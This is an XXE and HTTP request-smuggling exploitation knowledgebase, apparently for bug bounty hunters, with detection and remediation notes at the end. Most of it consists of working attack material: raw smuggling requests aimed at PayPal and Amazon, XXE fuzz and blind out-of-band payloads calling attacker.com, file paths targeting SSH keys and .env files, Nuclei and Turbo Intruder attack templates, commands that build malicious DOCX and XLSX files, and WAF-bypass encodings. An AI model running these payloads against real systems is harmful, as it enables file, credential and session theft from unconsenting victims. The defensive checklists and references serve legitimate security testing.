### Case Study 1: PayPal Login Page (Request Smuggling + Cache Poisoning)

**Researcher**: James Kettle (PortSwigger)
**Impact**: Persistent JavaScript hijacking on login page
**Chain**: Request Smuggling → Cache Poisoning → JS File Hijacking → Credential Theft

```http
POST /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Content-Length: 61
Transfer-Encoding: chunked

0
GET /webstatic HTTP/1.1
Host: skeletonscribe.net
X: X
GET /webstatic/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Connection: close
```

### Case Study 2: Amazon.com (Browser-Powered Desync)

**Researcher**: James Kettle (PortSwigger)
**Impact**: Request smuggling on single-server architecture
**Chain**: CL.0 Desync → Browser fetch() → Shopping List Data Exfiltration

```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: X
GET / HTTP/1.1
Host: www.amazon.com
```

### Case Study 3: Ivanti Connect Secure (SAML XXE)

**CVE**: CVE-2024-22024
**Impact**: Auth bypass via SAML XXE
**Vector**: SAML endpoint `/dana-na/auth/saml-sso.cgi`

```xml
<!-- SAMLRequest with XXE payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:AuthnRequest [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
</samlp:AuthnRequest>
```

### Case Study 4: GeoServer XXE (CVE-2025-58360)

**Impact**: 50K+ exposed instances
**Vector**: XML processing in GeoServer WMS/WFS
**Nuclei Template**: Added in November 2025 release

### Case Study 5: MITREid Connect (OAuth + XXE)

**CVE**: CVE-2021-26715
**Impact**: SSRF + XSS via logo_uri in dynamic client registration
**Chain**: Dynamic Registration → logo_uri SSRF → Client Logo Display → XSS

---

## Fuzzing Payloads

### Basic XXE Fuzz List

```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/">]>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/">%xxe;]>
<!DOCTYPE foo [<!ENTITY xxe PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "file:///etc/passwd">]>
```

### Blind XXE Fuzz List

```
<!DOCTYPE foo [<!ENTITY % a SYSTEM "http://attacker.com/">%a;]>
<!DOCTYPE foo [<!ENTITY % a SYSTEM "http://attacker.com:80/">%a;]>
<!DOCTYPE foo [<!ENTITY % a SYSTEM "ftp://attacker.com:21/">%a;]>
<!DOCTYPE foo [<!ENTITY % a SYSTEM "https://attacker.com/">%a;]>
```

### File Path Fuzzing (Unix)

```
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/status
file:///proc/self/fd/0
file:///proc/self/fd/1
file:///proc/self/fd/2
file:///root/.bash_history
file:///root/.ssh/id_rsa
file:///var/log/apache2/access.log
file:///var/log/nginx/access.log
file:///tmp/test.txt
file:///home/user/.ssh/id_rsa
file:///opt/app/config.yml
file:///app/.env
```

### File Path Fuzzing (Windows)

```
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/inetpub/wwwroot/web.config
file:///C:/Users/Public/Desktop/test.txt
file:///C:/xampp/htdocs/index.php
file:///C:/Program Files/App/config.xml
file:///C:/Windows/debug/NetSetup.log
```

### Protocol Fuzzing

```
http://
https://
ftp://
file://
php://
phar://
data://
expect://
zip://
compress.zlib://
dict://
gopher://
ldap://
```

---

## Automation Workflows

### Recon + XXE Hunting Pipeline

```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. Filter live hosts
httpx -l subs.txt -o live.txt

# 3. Crawl for XML endpoints
katana -list live.txt -o endpoints.txt

# 4. Check for SOAP/WSDL
ffuf -w live.txt -u FUZZ/wsdl -mc 200

# 5. Nuclei XXE scan
nuclei -l live.txt -t http/vulnerabilities/xxe/

# 6. Check file upload endpoints
ffuf -w endpoints.txt -u FUZZ -X POST -H "Content-Type: multipart/form-data" -mc 200
```

### Burp Suite + XXE Workflow

```
1. Proxy all traffic through Burp
2. Filter by Content-Type: application/xml, text/xml
3. Send suspicious requests to Repeater
4. Test with basic XXE payload
5. If no direct response, test blind/OOB
6. Use Collaborator for OOB detection
7. Check file upload endpoints for SVG/DOCX/XLSX
```

### Turbo Intruder XXE Script

```python
# turbo_intruder_xxe.py
from urllib.parse import quote

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=5,
                          requestsPerConnection=100,
                          pipeline=False)

    xxe_payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaborator.net/">%xxe;]><foo/>',
    ]

    for payload in xxe_payloads:
        engine.queue(target.req, payload)

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```

---

## Recon Methodology

### Phase 1: Attack Surface Discovery

```
1. Identify all XML input vectors:
   - API endpoints with XML body
   - File upload features (SVG, DOCX, XLSX, PPTX)
   - SAML endpoints (/saml, /sso, /auth/saml)
   - SOAP services (/soap, /wsdl, /service)
   - RSS/Atom feed generators
   - Import/export functionality
   - Configuration parsers
   - Document preview/conversion

2. Technology fingerprinting:
   - X-Powered-By headers
   - Server headers (Apache, Nginx, IIS)
   - Framework detection (Spring, .NET, PHP, etc.)
   - XML parser identification
```

### Phase 2: XXE Testing Strategy

```
1. Direct XXE Test:
   - Submit basic file read payload
   - Check response for file contents
   - Test multiple file paths

2. Blind XXE Test:
   - Set up Collaborator/Interactsh
   - Test OOB parameter entities
   - Check for DNS/HTTP callbacks

3. Error-Based Test:
   - Test local DTD repurposing
   - Trigger parser errors
   - Check error messages for data leakage

4. File Upload Test:
   - Upload SVG with XXE
   - Upload DOCX/XLSX with XXE
   - Check processing behavior
```

### Phase 3: Impact Escalation

```
1. File Read → Source Code → Credentials
2. SSRF → Internal API → Admin Access
3. SSRF → Cloud Metadata → AWS Keys
4. XXE → Java Deserialization → RCE
5. XXE → PHP Phar → RCE
```

---

## Nuclei Templates

### Basic XXE Detection Template

```yaml
id: xxe-basic-detection

info:
  name: Basic XXE Detection
  author: your-name
  severity: high
  description: Detects basic XXE vulnerability via file read
  tags: xxe, oast

requests:
  - raw:
      - |
        POST {{BaseURL}}/api/xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
          - "daemon:.*:1:1:"
          - "bin:.*:2:2:"
        part: body
```

### Blind XXE OOB Template

```yaml
id: xxe-blind-oob

info:
  name: Blind XXE OOB Detection
  author: your-name
  severity: high
  description: Detects blind XXE via out-of-band interaction
  tags: xxe, oast, blind

requests:
  - raw:
      - |
        POST {{BaseURL}}/api/xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://{{interactsh-url}}/"> %xxe; ]>
        <test/>

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
```

### XXE via SVG Upload Template

```yaml
id: xxe-svg-upload

info:
  name: XXE via SVG File Upload
  author: your-name
  severity: high
  description: Detects XXE through SVG file upload processing
  tags: xxe, file-upload, svg

requests:
  - raw:
      - |
        POST {{BaseURL}}/upload HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="xxe.svg"
        Content-Type: image/svg+xml

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>
        ------WebKitFormBoundary--

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```

### XXE via SOAP Template

```yaml
id: xxe-soap-detection

info:
  name: XXE in SOAP Endpoint
  author: your-name
  severity: high
  description: Detects XXE vulnerability in SOAP web services
  tags: xxe, soap

requests:
  - raw:
      - |
        POST {{BaseURL}}/soap HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/getUser"

        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <getUser>
              <username>&xxe;</username>
            </getUser>
          </soap:Body>
        </soap:Envelope>

    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```

### XXE with Request Smuggling Template

```yaml
id: xxe-request-smuggling

info:
  name: XXE via Request Smuggling
  author: your-name
  severity: critical
  description: Chains request smuggling with XXE
  tags: xxe, request-smuggling, desync

requests:
  - raw:
      - |+
        POST /api/xml HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 4
        Transfer-Encoding: chunked

        59
        POST /api/xml HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml
        Content-Length: 200

        <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
        0

        GET / HTTP/1.1
        Host: {{Hostname}}

    unsafe: true
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```

---

## Tools and Scanners

### XXEinjector

```bash
# Clone and setup
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

# Basic usage
ruby XXEinjector.rb --host=target.com --path=/api/xml --file=req.txt --oob=http --verbose

# With proxy
ruby XXEinjector.rb --host=target.com --path=/api/xml --file=req.txt --proxy=http://127.0.0.1:8080

# Direct exfiltration
ruby XXEinjector.rb --host=target.com --path=/api/xml --file=req.txt --direct=/etc/passwd
```

### dtd-finder (GoSecure)

```bash
# Find DTD files on target system
git clone https://github.com/GoSecure/dtd-finder.git

# Usage
python3 dtd-finder.py --target target.com --wordlist dtd-wordlist.txt
```

### XXElixir (XLSX XXE)

```bash
# Install
pip install xxelixir

# Basic usage
python3 XXElixir.py --file template.xlsx --url https://attacker.com/xxe --output poisoned.xlsx

# Custom payload
python3 XXElixir.py --file template.xlsx --xxe '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' --output poisoned.xlsx
```

### oxml_xxe (DOCX/PPTX XXE)

```bash
# Clone
git clone https://github.com/BuffaloWill/oxml_xxe.git

# Create malicious DOCX
ruby oxml_xxe.rb --docx template.docx --payload xxe --output malicious.docx

# Create malicious XLSX
ruby oxml_xxe.rb --xlsx template.xlsx --payload xxe --output malicious.xlsx
```

### Burp Suite Extensions

- **HTTP Request Smuggler**: Detects and exploits request smuggling
- **Param Miner**: Discovers hidden parameters and headers
- **Turbo Intruder**: High-speed fuzzing and exploitation
- **Logger++**: Enhanced logging for request/response analysis

### Nuclei

```bash
# Run XXE templates
nuclei -u target.com -t http/vulnerabilities/xxe/

# Custom template
nuclei -u target.com -t custom-xxe.yaml

# With interactsh for OOB
nuclei -u target.com -t xxe-blind.yaml -iserver interactsh.com
```

### Interactsh

```bash
# Start interactsh client
interactsh-client

# Use in XXE payloads
# http://[unique-id].interactsh.com/
```

---

## Advanced Research

### James Kettle's Research (PortSwigger)

1. **HTTP Desync Attacks**: Request smuggling reborn
2. **Browser-Powered Desync Attacks**: Single-server exploitation
3. **Web Cache Entanglement**: Novel poisoning pathways
4. **Practical Web Cache Poisoning**: Turning caches into exploit delivery systems

### Arseniy Sharoglazov's Research

- **Local DTD Repurposing**: Error-based blind XXE without external connections
- **XXE via Local DTD**: Ranked #7 in Top 10 Web Hacking Techniques 2018

### ProjectDiscovery Research

- **Nuclei Templates**: Automated XXE detection at scale
- **Interactsh**: Out-of-band interaction detection
- **Katana**: Web crawler for endpoint discovery

### GoSecure Research

- **dtd-finder**: Automated local DTD enumeration
- **XXE in Java**: Deserialization chains via XXE

---

## Bug Bounty Writeups

### Notable XXE Bounties

| Target | Researcher | Impact | Bounty |
|--------|-----------|--------|--------|
| PayPal | James Kettle | Cache Poisoning + Request Smuggling + XXE | $70K+ |
| Amazon | James Kettle | Browser-Powered Desync | Undisclosed |
| GitHub | James Kettle | Fat GET Cache Poisoning | $10K |
| Mozilla | James Kettle | SHIELD System Hijacking | $1K |
| New Relic | James Kettle | Internal API Access via Smuggling | Undisclosed |
| Ivanti | Multiple | SAML XXE Auth Bypass | CVE-2024-22024 |
| GeoServer | Multiple | XXE in WMS/WFS | CVE-2025-58360 |
| MITREid Connect | Artsploit | OAuth SSRF + XSS | CVE-2021-26715 |

### Writeup Resources

- PortSwigger Research Blog
- HackerOne Hacktivity
- Bugcrowd Research
- Intigriti Blog
- YesWeHack Learn

---

## Payload Collections

### Swissky's PayloadsAllTheThings (XXE)

Repository: `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection`

Categories:
- Basic XXE
- Blind XXE
- Error-based XXE
- XXE via file upload
- XXE in Java
- XXE in PHP
- XXE in .NET

### PayloadBox XXE Collection

Repository: `https://github.com/payloadbox/xxe-injection-payload-list`

Files:
- `xxe-basic.txt`
- `xxe-file-disclosure.txt`
- `xxe-ssrf.txt`
- `xxe-blind-oob.txt`
- `xxe-error-based.txt`
- `xxe-dos.txt`
- `xxe-xinclude.txt`
- `xxe-svg.txt`
- `xxe-soap.txt`
- `xxe-php-wrappers.txt`

### SecLists XXE Fuzzing

```
/usr/share/seclists/Fuzzing/xxe.txt
```

### 0xspade XXE Collection

Repository: `https://github.com/0xspade/bugbounty/tree/master/xxe`

---

## WAF Bypasses

### Encoding Bypasses

```xml
<!-- UTF-7 encoding -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo [+ADw-!ENTITY xxe SYSTEM +ACI-file:///etc/passwd+ACI-+AD4-]+AD4-
<foo>+ACY-xxe+ADs-</foo>
```

```xml
<!-- HTML entities -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;>
]>
<foo>&xxe;</foo>
```

```xml
<!-- Hex encoding in entities -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM &#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;>
]>
```

### Structural Bypasses

```xml
<!-- Double encoding -->
<!DOCTYPE foo [
  <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
  %a;
]>
```

```xml
<!-- Using CDATA -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo><![CDATA[&xxe;]]></foo>
```

```xml
<!-- Namespace tricks -->
<foo xmlns:bar="http://test">
  <bar:baz>&xxe;</bar:baz>
</foo>
```

### Content-Type Bypasses

```http
Content-Type: application/xml; charset=utf-16
Content-Type: text/xml
Content-Type: application/soap+xml
Content-Type: application/xhtml+xml
Content-Type: multipart/form-data
```

### Parameter Pollution

```xml
<!-- Duplicate parameters to confuse parser -->
<?xml version="1.0"?>
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Comment Injection

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "fi<!---->le:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Protocol Case Variations

```
FILE:///etc/passwd
File:///etc/passwd
fIlE:///etc/passwd
file:////etc/passwd
file://localhost/etc/passwd
file://127.0.0.1/etc/passwd
```

---

## Detection Techniques

### Passive Detection

```
1. Monitor for XML in request bodies
2. Check Content-Type headers for XML variants
3. Identify SOAP/WSDL endpoints
4. Look for file upload endpoints accepting XML formats
5. Check SAML endpoints
```

### Active Detection

```
1. Send basic XXE payload and observe response
2. Use OOB detection (Collaborator, Interactsh)
3. Test error-based extraction
4. Test file upload processing
5. Test parameter entities
```

### Log Analysis

```
Indicators of XXE exploitation:
- Requests containing <!DOCTYPE or <!ENTITY
- Outbound connections to unexpected URLs
- File access patterns in application logs
- XML parsing errors containing file paths
- DNS queries for attacker-controlled domains
```

### Network Detection

```
- Monitor for outbound HTTP/FTP from application servers
- Detect DNS queries for suspicious domains
- Alert on file access patterns (sequential /etc/* reads)
- Monitor for entity expansion resource exhaustion
```

---

## References

### Official Documentation

- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [W3C XML 1.0 Specification](https://www.w3.org/TR/xml/)
- [W3C XInclude 1.0](https://www.w3.org/TR/xinclude/)
- [MDN SVG Documentation](https://developer.mozilla.org/en-US/docs/Web/SVG)

### Research Papers

- PortSwigger Research:
  - HTTP Desync Attacks: Request Smuggling Reborn
  - Browser-Powered Desync Attacks
  - Web Cache Entanglement
  - Practical Web Cache Poisoning
  - Hidden OAuth Attack Vectors

### Tools

- [XXEinjector](https://github.com/enjoiz/XXEinjector)
- [dtd-finder](https://github.com/GoSecure/dtd-finder)
- [XXElixir](https://github.com/yeswehack/XXElixir)
- [oxml_xxe](https://github.com/BuffaloWill/oxml_xxe)
- [Nuclei](https://github.com/projectdiscovery/nuclei)
- [Interactsh](https://github.com/projectdiscovery/interactsh)

### Payload Collections

- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [PayloadBox XXE List](https://github.com/payloadbox/xxe-injection-payload-list)
- [SecLists - Fuzzing/xxe.txt](https://github.com/danielmiessler/SecLists)

### Bug Bounty Resources

- [PortSwigger Web Security Academy - XXE](https://portswigger.net/web-security/xxe)
- [YesWeHack XXE Guide](https://www.yeswehack.com/learn-bug-bounty/xml-external-entity-guide-xxe)
- [HackTricks XXE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)
- [Intigriti Advanced XXE](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-advanced-xxe-vulnerabilities)

### CVEs

- CVE-2024-22024 (Ivanti SAML XXE)
- CVE-2021-26715 (MITREid Connect OAuth SSRF)
- CVE-2025-58360 (GeoServer XXE)
- CVE-2026-28809 (esaml XXE)
- CVE-2021-27582 (MITREid redirect_uri bypass)

---

## Quick Reference Card

### Detection Checklist

- [ ] Test all XML input endpoints with basic file read payload
- [ ] Test blind XXE with OOB callback
- [ ] Test error-based XXE with local DTD
- [ ] Test file upload for SVG, DOCX, XLSX processing
- [ ] Test SAML endpoints for XXE
- [ ] Test SOAP/WSDL endpoints
- [ ] Test XInclude support
- [ ] Check for request smuggling + XXE chain potential
- [ ] Check for cache poisoning + XXE chain potential
- [ ] Test WAF bypass techniques

### Severity Assessment

| Capability | Severity |
|-----------|----------|
| Arbitrary file read | High |
| SSRF to internal services | High |
| Cloud metadata access | Critical |
| RCE via deserialization | Critical |
| DoS (Billion Laughs) | Medium |
| Error-based data exfil | High |

### Remediation

1. **Disable DTD processing entirely** where possible
2. **Disable external entities** in XML parser configuration
3. **Use JSON** instead of XML for data interchange
4. **Validate and sanitize** all XML input
5. **Use least privilege** for application processes
6. **Monitor** for XML parsing anomalies
7. **Patch XML parsers** regularly

---

*This knowledgebase is compiled from public research, CVE data, and community contributions. Use responsibly and only on authorized systems.*
